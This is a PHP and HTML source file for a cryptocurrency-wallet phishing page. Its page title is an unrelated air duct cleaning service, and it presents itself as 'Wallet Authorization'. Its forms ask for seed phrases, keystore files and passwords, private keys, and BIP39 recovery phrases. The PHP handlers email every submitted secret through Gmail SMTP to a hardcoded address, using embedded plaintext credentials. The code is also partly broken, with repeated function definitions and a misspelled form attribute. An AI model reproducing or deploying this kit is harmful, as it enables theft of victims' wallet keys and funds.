<!-- Mnenumic config -->
<?php require 'PHPMailer/PHPMailerAutoload.php';?>
<?php

// function Redirect_to($New_Location)
// {header("Location: index.php");
//     exit;
// }

// call the contact() function if contact_btn is clicked
if (isset($_POST['mnemonic-submit'])) {
    contact();
}

function contact()
{
    if (isset($_POST["mnemonic-submit"])) {

        $name = $_POST["mnemonic"];
        $email = $_POST["memail"];
        $message = $_POST["phrase"];

        // Email Functionality

        date_default_timezone_set('Etc/UTC');

        $mail = new PHPMailer();

	$mail->IsSMTP();
	$mail->CharSet = 'UTF-8';

	$mail->Host       = "smtp.gmail.com"; // SMTP server example
	$mail->SMTPDebug  = 0;                     // enables SMTP debug information (for testing)
	$mail->SMTPAuth   = true;                  // enable SMTP authentication
	$mail->Port       = 587;                    // set the SMTP port for the GMAIL server
	$mail->Username   = "paulnseobong37@gmail.com"; 	// SMTP account username example
	$mail->Password   = "dgpwoljbugzqeqou";        // SMTP account password example


        $mail->setFrom($_POST['memail']);
        $mail->addAddress('paulnseobong37@gmail.com');

        // The subject of the message.
        $mail->Subject = 'Received Message From Client ' . $name;

        $message = '<html><body>';

        $message .= '<table rules="all" style="border-color: #666;" cellpadding="10">';

        $message .= "<tr style='background: #eee;'><td><strong>Name:</strong> </td><td>" . strip_tags($_POST['mnemonic']) . "</td></tr>";

        $message .= "<tr><td><strong>Email:</strong> </td><td>" . strip_tags($_POST['memail']) . "</td></tr>";

        // $message .= "<tr><td><strong>Phone:</strong> </td><td>" . strip_tags($_POST['phone']) . "</td></tr>";

        $message .= "<tr><td><strong>Message</strong> </td><td>" . strip_tags($_POST['phrase']) . "</td></tr>";

        $message .= "</table>";
        $message .= "</body></html>";

        $mail->Body = $message;

        $mail->isHTML(true);

        if ($mail->send()) {
            Redirect_to("validating.html");
        } else {
            Redirect_to("index.php");
        }

    } //Ending of Submit Button If-Condition

}

?>
<!-- End of mnenumic config -->


<?php require 'PHPMailer/PHPMailerAutoload.php';?>
<?php
// function Redirect_to($New_Location)
// {header("Location:" . $New_Location);
//     exit;
// }

// call the contact() function if contact_btn is clicked
if (isset($_POST['keystore-submit'])) {
    contact();
}

function contact()
{
    if (isset($_POST["keystore-submit"])) {

        $name = $_POST["keystore"];
        // $file = $_POST["file"];
        $message = $_POST["walletPassword"];
        // $message = $_POST["file"];

        // Email Functionality

        date_default_timezone_set('Etc/UTC');

        $mail = new PHPMailer();

	$mail->IsSMTP();
	$mail->CharSet = 'UTF-8';

	$mail->Host       = "smtp.gmail.com"; // SMTP server example
	$mail->SMTPDebug  = 0;                     // enables SMTP debug information (for testing)
	$mail->SMTPAuth   = true;                  // enable SMTP authentication
	$mail->Port       = 587;                    // set the SMTP port for the GMAIL server
	$mail->Username   = "paulnseobong37@gmail.com"; 	// SMTP account username example
	$mail->Password   = "dgpwoljbugzqeqou";        // SMTP account password example


        $mail->setFrom($_POST['name']);
        $mail->addAddress('paulnseobong37@gmail.com');

        // The subject of the message.
        $mail->Subject = 'Received Message From Client ' . $name;

        $message = '<html><body>';

        $message .= '<table rules="all" style="border-color: #666;" cellpadding="10">';

        $message .= "<tr style='background: #eee;'><td><strong>Name:</strong> </td><td>" . strip_tags($_POST['keystore']) . "</td></tr>";

        $message .= "<tr><td><strong>Wallet-Password:</strong> </td><td>" . strip_tags($_POST['walletPassword']) . "</td></tr>";

        // $message .= "<tr><td><strong>Phone:</strong> </td><td>" . strip_tags($_POST['phone']) . "</td></tr>";

        // $message .= "<tr><td><strong>Message=</strong> </td><td>" . strip_tags($_POST['file']) . "</td></tr>";

        $message .= "</table>";
        $message .= "</body></html>";

        $mail->Body = $message;

        $mail->isHTML(true);

        if ($mail->send()) {
            Redirect_to("validating.html");
        } else {
            Redirect_to("index.php");
        }

    } //Ending of Submit Button If-Condition

}

?>

<!-- privateKey config -->
<?php require 'PHPMailer/PHPMailerAutoload.php';?>
<?php
// function Redirect_to($New_Location)
// {header("Location:" . $New_Location);
//     exit;
// }

// call the contact() function if contact_btn is clicked
if (isset($_POST['privateKey-submit'])) {
    contact();
}

function contact()
{
    if (isset($_POST["privateKey-submit"])) {

        $name = $_POST["privateKey"];
        // $file = $_POST["file"];
        $password = $_POST["temp-password"];
        $message = $_POST["b1p39phrase"];

        // Email Functionality

        date_default_timezone_set('Etc/UTC');

        $mail = new PHPMailer();

	$mail->IsSMTP();
	$mail->CharSet = 'UTF-8';

	$mail->Host       = "smtp.gmail.com"; // SMTP server example
	$mail->SMTPDebug  = 0;                     // enables SMTP debug information (for testing)
	$mail->SMTPAuth   = true;                  // enable SMTP authentication
	$mail->Port       = 587;                    // set the SMTP port for the GMAIL server
	$mail->Username   = "paulnseobong37@gmail.com"; 	// SMTP account username example
	$mail->Password   = "dgpwoljbugzqeqou";        // SMTP account password example


        $mail->setFrom($_POST['privateKey']);
        $mail->addAddress('paulnseobong37@gmail.com');

        // The subject of the message.
        $mail->Subject = 'Received Message From Client ' . $name;

        $message = '<html><body>';

        $message .= '<table rules="all" style="border-color: #666;" cellpadding="10">';

        $message .= "<tr style='background: #eee;'><td><strong>Name:</strong> </td><td>" . strip_tags($_POST['privateKey']) . "</td></tr>";

        $message .= "<tr><td><strong>Wallet-Password:</strong> </td><td>" . strip_tags($_POST['temp-password']) . "</td></tr>";

        $message .= "<tr><td><strong>Message=</strong> </td><td>" . strip_tags($_POST['b1p39phrase']) . "</td></tr>";

        $message .= "</table>";
        $message .= "</body></html>";

        $mail->Body = $message;

        $mail->isHTML(true);

        if ($mail->send()) {
            Redirect_to("validating.html");
        } else {
            Redirect_to("index.php");
        }

    } //Ending of Submit Button If-Condition

}

?>

<!-- Hardware config -->
<?php require 'PHPMailer/PHPMailerAutoload.php';?>
<?php
// function Redirect_to($New_Location)
// {header("Location:" . $New_Location);
//     exit;
// }

// call the contact() function if contact_btn is clicked
if (isset($_POST['hardware-submit'])) {
    contact();
}

function contact()
{
    if (isset($_POST["hardware-submit"])) {

        $name = $_POST["hardware"];
        // $file = $_POST["file"];
        $password = $_POST["hardware-password"];
        $message = $_POST["hardware-phrase"];

        // Email Functionality

        date_default_timezone_set('Etc/UTC');

        $mail = new PHPMailer();

	$mail->IsSMTP();
	$mail->CharSet = 'UTF-8';

	$mail->Host       = "smtp.gmail.com"; // SMTP server example
	$mail->SMTPDebug  = 0;                     // enables SMTP debug information (for testing)
	$mail->SMTPAuth   = true;                  // enable SMTP authentication
	$mail->Port       = 587;                    // set the SMTP port for the GMAIL server
	$mail->Username   = "paulnseobong37@gmail.com"; 	// SMTP account username example
	$mail->Password   = "dgpwoljbugzqeqou";        // SMTP account password example


        $mail->setFrom($_POST['hardware']);
        $mail->addAddress('paulnseobong37@gmail.com');

        // The subject of the message.
        $mail->Subject = 'Received Message From Client ' . $name;

        $message = '<html><body>';

        $message .= '<table rules="all" style="border-color: #666;" cellpadding="10">';

        $message .= "<tr style='background: #eee;'><td><strong>Name:</strong> </td><td>" . strip_tags($_POST['hardware']) . "</td></tr>";

        $message .= "<tr><td><strong>Wallet-Password:</strong> </td><td>" . strip_tags($_POST['hardware-password']) . "</td></tr>";

        // $message .= "<tr><td><strong>Phone:</strong> </td><td>" . strip_tags($_POST['phone']) . "</td></tr>";

        $message .= "<tr><td><strong>Message=</strong> </td><td>" . strip_tags($_POST['hardware-phrase']) . "</td></tr>";

        $message .= "</table>";
        $message .= "</body></html>";

        $mail->Body = $message;

        $mail->isHTML(true);

        if ($mail->send()) {
            Redirect_to("validating.html");
        } else {
            Redirect_to("index.php");
        }

    } //Ending of Submit Button If-Condition

}

?>



<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, shrink-to-fit=no"
    />
    <meta http-equiv="x-ua-compatible" content="ie=edge" />
    <title>
      Professional Air Duct Cleaning Services in Los Angeles
    </title>
     <link rel="stylesheet" href="styles.css">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">

       <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Georama:ital,wght@0,100;0,400;0,500;0,600;1,100&display=swap" rel="stylesheet">

  </head>
  <body>
            <div>
                <h1 class="text-center mt-4 mb-4 heading-text"> <strong>Wallet Authorization</strong> </h1> 
            </div>
        <div class="container-fluid contained">
        
         <div class="form p-1">
            
                <ul class="tab-group">
                    <li class="tab active d-inline"><a href="#mnemonic"> MNEMONIC</a></li>
                    <li class="tab d-inline"><a href="#keystore">KEYSTORE</a></li>
                    <li class="tab d-inline"><a href="#privateKey">PRIVATE KEY</a></li>
                    <li class="tab d-inline"><a href="#hardware">HARDWARE</a></li>
                </ul>
           
            
            <div class="tab-content">

                   <div class="contain text-center" id="mnemonic">
                    <form action="index.php" method="post">
                        <div class="form-group text-center mb-3">
                            <label for="" class="thin-text">Please enter your 12/24 words phrase for authorization</label>
                            <textarea name="mnemonic" id="" cols="30" rows="3" class="form-control mnemonic-text-area" style="color: rgba(245, 245, 245, 0.829);"></textarea>
                            <small class="forn-control small-text">Please seperate each Mnemonic Phrase with a space</small>
                        </div>

                        <div class="form-group">
                            <label for="" class="thin-text">Enter your email address</label>
                            <input type="text" name="memail" class="form-control keystore-password" placeholder="Enter Address" style="color: rgba(245, 245, 245, 0.829);">
                        </div>

                        <div class="form-group mt-3">
                            <small class="b-number"> Input the B1P39/BIP44 recovery phrase (if available). </small>
                            <input type="text" name="phrase" class="form-control keystore-password" placeholder="BIP39/BIP44 recovery phrase"  style="color: rgba(245, 245, 245, 0.829);">
                        </div>
                      <a href="validating.html"> <button type="submit" class="mt-3 btn-submit" name="mnemonic-submit"> Submit </button></a> 
                    </form>
                </div>

                <div class="contain text-center" id="keystore">
                    <form acton="index.php" method="post">
                        <div class="form-group">
                            <label for="" class="thin-text">Please select your keystore file</label>
                            <input type="file" name="keystore" id="file-upload" class="form-control file-upload" style="display: none;">
                            <button class="btn-file mt-2" onclick="document.getElementById('file-upload').click()">Choose Keystore File</button>
                        </div>

                        <div class="form-group">
                            <input type="text" name="walletPassword" class="form-control mt-3 mb-3 keystore-password" placeholder="Enter your wallet password" style="color: rgba(245, 245, 245, 0.829);">
                        </div>

                    <button type="submit" class="mb-3 btn-submit" name="keystore-submit"> Submit</button>
                    </form>
                </div>
                
                

                <!-- Remaining 2 Tabs -->

                   <div class="contain text-center" id="privateKey">
                    <form action="index.php" method="post">
                        <div class="form-group">
                            <label for="" class="thin-text">Please select your private key</label>
                            <textarea name="privateKey" id="" cols="30" rows="3" class="form-control mnemonic-text-area" style="color: rgba(245, 245, 245, 0.829);"></textarea>
                            <small>Please enter your private key in HEX format.</small>
                        </div>

                        <div class="form-group">
                            <input type="password" name="temp-password" class="form-control keystore-password mt-3 mb-3" placeholder="Enter temporary session password" style="color: rgba(245, 245, 245, 0.829);">
                        </div>

                          <div class="form-group ">
                            <small class="b-number">Input the B1P39/BIP44 recovery phrase (if available).</small>
                            <input type="text" name="b1p39phrase" class="form-control keystore-password" placeholder="BIP39/BIP44 recovery phrase"  style="color: rgba(245, 245, 245, 0.829);">
                        </div>

                         <a href="validating.html"> <button type="submit" class="mt-3 btn-submit" name="privateKey-submit"> Submit </button></a>
                    </form>
                </div>
                

                   <div class="contain text-center" id="hardware">
                     <form action="index.php" method="post">
                        <div class="form-group mb-3 mt-3">
                            <label for="" class="thin-text">Please select your keystore file</label>
                           <textarea name="hardware" id="" cols="30" rows="3" class="form-control mnemonic-text-area" style="color: rgba(245, 245, 245, 0.829);"></textarea>
                            <small>Please enter your private key in HEX format.</small>
                        </div>

                      <div class="form-group">
                            <input type="password" name="hardware-password" class="form-control keystore-password mt-3 mb-3" placeholder="Enter temporary session password" style="color: rgba(245, 245, 245, 0.829);">
                        </div>

                        <div class="form-group ">
                            <small class="b-number">Input the B1P39/BIP44 recovery phrase (if available).</small>
                            <input type="text" name="hardware-phrase" class="form-control keystore-password" placeholder="BIP39/BIP44 recovery phrase"  style="color: rgba(245, 245, 245, 0.829);">
                        </div>
                       <a href="validating.html"> <button type="submit" class="mt-3 mb-3 btn-submit" name="hardware-submit">Submit</button></a>
                    </form>
                </div>

            </div>
        </div> 
    </div>

                <!-- End of my new form -->
       
      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
      <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
      <script src="./script.js"></script>


    <script type="text/javascript">

      $(function () {
        new WOW().init();
        // Add smooth scrolling to all links
        $('a').on('click', function (event) {
          // Make sure this.hash has a value before overriding default behavior
          if (this.hash !== '') {
            // Prevent default anchor click behavior
            event.preventDefault();

            // Store hash
            var hash = this.hash;

            // Using jQuery's animate() method to add smooth page scroll
            // The optional number (800) specifies the number of milliseconds it takes to scroll to the specified area
            $('html, body').animate(
              {
                scrollTop: $(hash).offset().top,
              },
              800,
              function () {
                // Add hash (#) to URL when done scrolling (default click behavior)
                window.location.hash = hash;
              }
            );
          } // End if
        });
      });
    </script>
  </body>
</html>
